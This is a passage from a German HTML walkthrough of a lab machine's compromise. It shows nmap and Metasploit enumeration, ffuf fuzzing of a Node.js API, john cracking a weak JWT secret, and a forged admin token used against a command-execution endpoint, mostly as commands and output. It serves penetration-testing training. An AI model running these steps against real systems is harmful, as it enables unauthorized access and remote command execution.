+                *   `nmap -sV --script nmap-vulners/`: Prüft auf bekannte CVEs basierend auf den erkannten Diensten/Versionen.
+                *   `nmap -sV --script http-csrf`: Prüft auf Cross-Site Request Forgery.
+                *   `ssh-keyscan`: Ruft die SSH-Hostschlüssel ab.
+                *   `nmap --script ssh-auth-methods`: Prüft erlaubte SSH-Authentifizierungsmethoden für `root`.
+                *   Metasploit `scanner/ssh/ssh_enumusers`: Versucht, gültige Benutzernamen über SSH zu finden.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   Vulners findet einige niedrig/mittel bewertete CVEs für OpenSSH 8.4p1, aber keine kritischen RCEs.
+                 *   Keine CSRF-Schwachstellen gefunden.
+                 *   `ssh-keyscan` liefert die erwarteten Hostschlüssel.
+                 *   SSH erlaubt `publickey`- und `password`-Authentifizierung für `root`.
+                 *   Metasploit findet die Benutzer `zyrian` und `zysk`, die aber laut Kommentar ("NICHTS.............") nicht relevant waren.
+                 Die Scans liefern keine direkten Hinweise auf den primären Angriffsvektor, bestätigen aber einige Systemdetails.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Da die automatisierten Scans wenig ergaben, konzentrieren Sie sich auf manuelle Enumeration und das Finden von API-Endpunkten der Node.js-Anwendung mittels Fuzzing (`ffuf`).
+             </p>
+             <!-- Nmap Vulners -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sV --script nmap-vulners/ 192.168.2.122</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 12:52 CEST
+Nmap scan report for aurora.hmv (192.168.2.122)
+Host is up (0.000087s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| vulners:
+|   cpe:/a:openbsd:openssh:8.4p1:
+|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
+|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
+|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
+|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
+|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
+3000/tcp open  http    Node.js Express framework
+MAC Address: 08:00:27:74:51:A7 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
+                     </pre>
+                 </div>
+             </div>
+             <!-- Nmap CSRF -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sV --script http-csrf 192.168.2.122</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 13:01 CEST
+Nmap scan report for aurora.hmv (192.168.2.122)
+Host is up (0.000084s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+3000/tcp open  http    Node.js Express framework
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+MAC Address: 08:00:27:74:51:A7 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
+                     </pre>
+                 </div>
+             </div>
+             <!-- ssh-keyscan -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh-keyscan 192.168.2.122</span></div>
+                     <pre>
+# 192.168.2.122:22 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
+192.168.2.122 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
+# 192.168.2.122:22 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
+192.168.2.122 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
+# 192.168.2.122:22 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
+192.168.2.122 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
+                     </pre>
+                 </div>
+             </div>
+             <!-- Nmap SSH Auth Methods -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap  --script ssh-auth-methods --script-args="ssh.user=root"  192.168.2.122 -p22</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 11:55 CEST
+Nmap scan report for aurora.hmv (192.168.2.122)
+Host is up (0.00015s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-auth-methods:
+|   Supported authentication methods:
+|     publickey
+|_    password
+MAC Address: 08:00:27:74:51:A7 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
+                     </pre>
+                 </div>
+             </div>
+             <!-- Metasploit ssh_enumusers -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole</span></div>
+                     <pre>
+# Metasploit banner...
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use scanner/ssh/ssh_enumusers</span></div>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">options</span></div>
+                     <pre>
+Module options (auxiliary/scanner/ssh/ssh_enumusers):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   CHECK_FALSE   false            no        Check for false positives (random username)
+   DB_ALL_USERS  false            no        Add all users in the current database to the lis
+# ... (weitere Optionen) ...
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set RHOSTS 192.168.2.122</span></div>
+                     <pre>RHOSTS => 192.168.2.122</pre>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set RPORT 22</span></div>
+                     <pre>RPORT => 22</pre>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set THREADS 1</span></div>
+                     <pre>THREADS => 1</pre>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set DB_ALL_USERS false</span></div>
+                     <pre>DB_ALL_USERS => false</pre>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set USER_FILE /usr/share/wordlists/usernames.txt</span></div>
+                     <pre>USER_FILE => /usr/share/wordlists/usernames.txt</pre>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">run</span></div>
+                     <pre>
+[*] Sending username probes...
+[+] 192.168.2.122:22 - SSH - User 'zyrian' found
+[+] 192.168.2.122:22 - SSH - User 'zysk' found
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+                     </pre>
+                     <p class="evaluation"><strong>Bewertung (Pentester):</strong> Die gefundenen Benutzer 'zyrian' und 'zysk' scheinen Sackgassen zu sein ("NICHTS.............").</p>
+                 </div>
+             </div>
+        </section>
+
+        <section id="endpoint-discovery">
+            <h2>Endpoint Discovery & Authentication</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `ffuf` wird verwendet, um nach Endpunkten auf Port 3000 zu suchen, indem Wörter aus einer Liste an den Pfad angehängt und POST-Anfragen gesendet werden (`-X POST`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `ffuf` findet drei Endpunkte, die auf POST-Anfragen reagieren, aber mit `401 Unauthorized` antworten: `/login`, `/execute`, `/LogIn`. Dies deutet auf eine API mit Authentifizierungsmechanismus hin.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Testen Sie die gefundenen Endpunkte `/login`, `/execute`, `/LogIn` manuell mit `curl`. Suchen Sie nach einem Registrierungs-Endpunkt (z.B. `/register`, `/signup`).
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.122:3000/FUZZ" -X POST</span></div>
+                    <pre>
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://192.168.2.122:3000/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+[Status: 401, Size: 22, Words: 2, Lines: 1, Duration: 170ms]
+    * FUZZ: login
+
+[Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 9ms]
+    * FUZZ: execute
+
+[Status: 401, Size: 22, Words: 2, Lines: 1, Duration: 22ms]
+    * FUZZ: LogIn
+
+:: Progress: [8160794/8160794] :: Job [1/1] :: 1147 req/sec :: Duration: [1:21:05] :: Errors: 0 ::
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die mit `ffuf` gefundenen Endpunkte werden manuell mit `curl` und der POST-Methode getestet. Zusätzlich werden gängige Registrierungs-Endpunkte (`/singin`, `/register`) versucht.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   `/login`, `/LogIn`: Antworten mit "Identifiants invalides" (Ungültige Anmeldedaten).
+                 *   `/execute`: Antwortet mit "Unauthorized".
+                 *   `/singin`: Existiert nicht ("Cannot POST /singin").
+                 *   `/register`: Antwortet mit "The "role" field is not valid". Dies ist ein wichtiger Hinweis! Ein Registrierungs-Endpunkt existiert und erwartet ein Feld namens `role`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Interagieren Sie weiter mit dem `/register`-Endpunkt. Senden Sie eine POST-Anfrage mit JSON-Body und einem `role`-Feld. Fuzzing Sie mögliche Werte für `role` (z.B. `user`, `admin`) und andere potenzielle Felder (`username`, `password`).
+             </p>
+            <!-- curl /login -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/login" -X POST</span></div>
+                     <pre>Identifiants invalides</pre>
+                 </div>
+            </div>
+            <!-- curl /execute -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/execute" -X POST</span></div>
+                     <pre>Unauthorized</pre>
+                 </div>
+             </div>
+             <!-- curl /LogIn -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/LogIn" -X POST</span></div>
+                      <pre>Identifiants invalides</pre>
+                  </div>
+              </div>
+              <!-- curl /singin -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/singin" -X POST</span></div>
+                      <pre>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /singin</pre>
+</body>
+</html>
+                      </pre>
+                  </div>
+              </div>
+              <!-- curl /register -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/register" -X POST</span></div>
+                      <pre>The "role" field is not valid</pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `ffuf` wird verwendet, um das Feld `role` im JSON-Body der POST-Anfrage an `/register` zu fuzzing. Es werden verschiedene Rollen aus einer Wortliste getestet.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Zwei interessante Reaktionen werden beobachtet:
+                 *   `"role":"user"` führt zu Status `500 Internal Server Error`. Dies deutet oft darauf hin, dass die Rolle gültig ist, aber andere erforderliche Felder (wie `username`, `password`) fehlen.
+                 *   `"role":"admin"` führt zu Status `401 Unauthorized`. Dies deutet darauf hin, dass die Rolle `admin` existiert, aber die Registrierung als Admin nicht erlaubt ist oder zusätzliche Authentifizierung erfordert.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Versuchen Sie, einen Benutzer mit `role: user` zu registrieren, indem Sie die Felder `username` und `password` zum JSON-Body hinzufügen. Testen Sie anschließend, ob eine Registrierung mit `role: admin` möglich ist (erwartet wird "Not authorized").
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.122:3000/register" -X POST -H "Content-Type: application/json" -d '{"role":"FUZZ"}'</span></div>
+                     <pre>
+        /'___\  /'___\           /'___\        /\ \__/\ \__
+       /\ \__/ /\ \__/  __  __  /\ \__/        \ \ ,_\ \ ,_\  __  __
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         \ \ \/\ \ \/\ \/\ \
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/          \ \ \_\ \ \_\ \ \_\ \
+         \ \_\   \ \_\  \ \____/  \ \_\           \ \__\\ \__\\ \____/
+          \/_/    \/_/   \/___/    \/_/            \/__/ \/__/ \/___/
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://192.168.2.122:3000/register
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Header           : Content-Type: application/json
+ :: Data             : {"role":"FUZZ"}
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+[Status: 500, Size: 32, Words: 5, Lines: 1, Duration: 56ms]
+    * FUZZ: user
+
+[Status: 401, Size: 16, Words: 3, Lines: 1, Duration: 41ms]
+    * FUZZ: admin
+
+:: Progress: [8160794/8160794] :: Job [1/1] :: 1003 req/sec :: Duration: [1:26:35] :: Errors: 0 ::
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Es wird versucht, sich explizit mit `role: admin` zu registrieren.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Wie erwartet, schlägt dies mit "Not authorized !" fehl.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/register" -X POST -H "Content-Type: application/json" -d '{"role":"admin"}'</span></div>
+                     <pre>Not authorized !</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                 <strong>Analyse:</strong> Es werden zwei Versuche unternommen, einen Benutzer mit `role: user` zu registrieren. Zuerst mit `username: admin`, dann mit `username: ben`.
+             </p>
+            <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   Versuch 1 (`username: admin`): Schlägt fehl mit "Username already exists". Dies bestätigt, dass ein Admin-Benutzer existiert.
+                 *   Versuch 2 (`username: ben`): Ist erfolgreich ("Registration OK").
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Sie haben erfolgreich den Benutzer `ben` mit Passwort `ben` und Rolle `user` registriert. Versuchen Sie nun, sich mit diesen Daten am `/login`-Endpunkt anzumelden, um einen Authentifizierungs-Token (wahrscheinlich JWT) zu erhalten.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/register" -X POST -H "Content-Type: application/json" -d '{"role":"user", "username":"admin", "password":"ben"}'</span></div>
+                     <pre>Username already exists</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/register" -X POST -H "Content-Type: application/json" -d '{"role":"user", "username":"ben", "password":"ben"}'</span></div>
+                      <pre>Registration OK</pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="jwt-exploitation">
+            <h2>JWT Exploitation (Secret Cracking & Forging)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der erfolgreichen Registrierung wurde (vermutlich durch einen `/login`-Aufruf, der hier nicht gezeigt wird) ein JSON Web Token (JWT) erhalten. Der JWT wird auf jwt.io analysiert. Der Header und Payload werden dekodiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   JWT: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJlbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgzMjkwNDUxfQ.FL-PM6gc0SwHSjZFhRUpTTtCMfUlrgzK0wsFjoU0bMg`
+                *   Header: `{"alg": "HS256", "typ": "JWT"}` (Standard HS256 Algorithmus)
+                *   Payload: `{"username": "ben", "role": "user", "iat": 1683290451}` (Enthält Benutzername, Rolle und Ausstellungszeitpunkt)
+                Das Ziel ist nun, diesen Token zu manipulieren, um die Rolle auf `admin` zu ändern. Da HS256 verwendet wird, muss der geheime Schlüssel (Secret) bekannt sein, um die Signatur neu zu berechnen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, das HS256-Secret mit Tools wie `john` oder `hashcat` zu cracken. Speichern Sie den JWT in einer Datei und verwenden Sie die entsprechende Hash-Formatkennung (z.B. `HMAC-SHA256` für John). Verwenden Sie eine gute Wortliste.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# JWT erhalten (vermutlich von /login nach Registrierung)
+# Analyse auf https://jwt.io/
+
+# Full JWT:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJlbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgzMjkwNDUxfQ.FL-PM6gc0SwHSjZFhRUpTTtCMfUlrgzK0wsFjoU0bMg
+
+# Decoded Header:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+# Decoded Payload:
+{
+  "username": "ben",
+  "role": "user",
+  "iat": 1683290451
+}
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, mit dem erhaltenen `user`-JWT auf den `/execute`-Endpunkt zuzugreifen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies schlägt mit "Not authorized" fehl. Der `user`-Rolle ist der Zugriff auf `/execute` nicht gestattet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Cracken Sie das JWT-Secret, um einen Admin-Token zu fälschen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/execute" -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJlbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgzMjkwNDUxfQ.FL-PM6gc0SwHSjZFhRUpTTtCMfUlrgzK0wsFjoU0bMg" -d '{"cmd":"id"}'</span></div>
+                     <pre>Not authorized</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erhaltene JWT wird in eine Datei `jwt.hash` gespeichert. `john` wird mit der `rockyou.txt`-Wortliste verwendet, um das HS256-Secret zu cracken.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `john` findet das Secret erfolgreich: `<span class="password">nopassword</span>`. Dies ist ein extrem schwaches Secret.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Fälschen Sie nun den JWT. Ändern Sie im Payload `username` und `role` auf `admin`. Verwenden Sie das Secret `nopassword` und den Algorithmus `HS256`, um die neue Signatur zu generieren (z.B. mit jwt.io oder einem Skript).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Verwenden Sie niemals schwache oder erratbare Secrets für JWTs. Generieren Sie lange, zufällige Secrets und speichern Sie sie sicher. Erwägen Sie die Verwendung asymmetrischer Algorithmen (RS256 etc.), bei denen der private Schlüssel zum Signieren nicht auf dem Server preisgegeben werden muss (obwohl hier HS256 verwendet wird).
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi jwt.hash</span></div>
+                     <!-- Inhalt: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJlbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgzMjkwNDUxfQ.FL-PM6gc0SwHSjZFhRUpTTtCMfUlrgzK0wsFjoU0bMg -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">nopassword</span>       (?)
+1g 0:00:00:00 DONE (2023-05-05 14:50) 1.204g/s 29609p/s 29609c/s 29609C/s Cl0udP4ss40p4city#8700..q8zo8wzq
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Prozess des Fälschens des JWT wird beschrieben. Der Payload wird geändert (`username: admin`, `role: admin`) und das gefundene Secret (`nopassword`) wird verwendet, um die neue Signatur zu berechnen. Das resultierende gefälschte Admin-JWT wird gezeigt.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Prozess ist korrekt beschrieben. Das neue JWT (`eyJ...up0`) sollte nun Admin-Privilegien gewähren.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verwenden Sie dieses gefälschte Admin-JWT, um Anfragen an den `/execute`-Endpunkt zu senden.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# JWT Fälschungsprozess (z.B. mit https://jwt.io/)
+
+# Original Payload:
+{
+  "username": "ben",
+  "role": "user",
+  "iat": 1683290451
+}
+
+# Geändeter Payload:
+{
+  "username": "admin",
+  "role": "admin",
+  "iat": 1683290451
+}
+
+# Verwendetes Secret (gecrackt):
+nopassword
+
+# Resultierendes gefälschtes JWT (Header + Neuer Payload + Neue Signatur):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (www-data RCE)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, den `/execute`-Endpunkt mit dem gefälschten Admin-JWT und dem Parameter `cmd=id` aufzurufen.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Versuch schlägt fehl mit einem `TypeError [ERR_INVALID_ARG_TYPE]`. Die Fehlermeldung aus `app.js` deutet darauf hin, dass die Anwendung einen Dateinamen erwartet (`The "file" argument must be of type string`), aber `undefined` erhalten hat, weil sie versucht, auf einen Parameter zuzugreifen, der nicht `cmd` heißt. Der Parameter für die Befehlsausführung muss einen anderen Namen haben.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Fuzzing des Parameter*namens* (des Schlüssels im JSON-Body) für den `/execute`-Endpunkt, während ein fester Wert (z.B. `id`) verwendet wird. Benutzen Sie `ffuf` mit einer Liste gängiger Parameternamen (z.B. `command`, `exec`, `cmd`, `run`).
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/execute" -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0" -d '{"cmd":"id"}'</span></div>
+                     <pre>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>TypeError [ERR_INVALID_ARG_TYPE]: The &quot;file&quot;
+argument must be of type string. Received undefined<br> &nbsp;
+&nbsp;at validateString (internal/validators.js:120:11)<br>
+&nbsp; &nbsp;at normalizeSpawnArguments (child_process.js:411:3)
+<br> &nbsp; &nbsp;at spawn (child_process.js:547:16)
+<br> &nbsp; &nbsp;at Object.execFile (child_process.js:237:17)
+<br> &nbsp; &nbsp;at exec (child_process.js:158:25)
+<br> &nbsp; &nbsp;at /opt/login-app/app.js:69:3
+<br> &nbsp; &nbsp;at Layer.handle [as handle_request]
+(/opt/login-app/node_modules/express/lib/router/layer.js:95:5)
+<br> &nbsp; &nbsp;
+at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)
+<br> &nbsp; &nbsp;at /opt/login-app/app.js:112:5
+<br> &nbsp; &nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12</pre>
+</body>
+</html>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `ffuf` wird verwendet, um den *Namen* des Parameters im JSON-Body zu fuzzing. `-d '{"FUZZ":"id"}'`. Es wird eine Wortliste mit gängigen Objekt-/Parameternamen verwendet. Antworten mit 54 Bytes werden ignoriert (`-fw 54`).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> `ffuf` findet den korrekten Parameternamen: `command`. Die Anfrage mit `{"command":"id"}` liefert Status 200.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verwenden Sie nun den Parameter `command` im JSON-Body, um Befehle über den `/execute`-Endpunkt mit dem Admin-JWT auszuführen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u "http://192.168.2.122:3000/execute" -X POST -H "Content-Type: application/json"  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0" -d '{"FUZZ":"id"}' -fw 54</span></div>
+                     <pre>
+
+        /'___\  /'___\           /'___\        /\ \__/\ \__
+       /\ \__/ /\ \__/  __  __  /\ \__/        \ \ ,_\ \ ,_\  __  __
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         \ \ \/\ \ \/\ \/\ \
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/          \ \ \_\ \ \_\ \ \_\ \
+         \ \_\   \ \_\  \ \____/  \ \_\           \ \__\\ \__\\ \____/
+          \/_/    \/_/   \/___/    \/_/            \/__/ \/__/ \/___/
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : POST
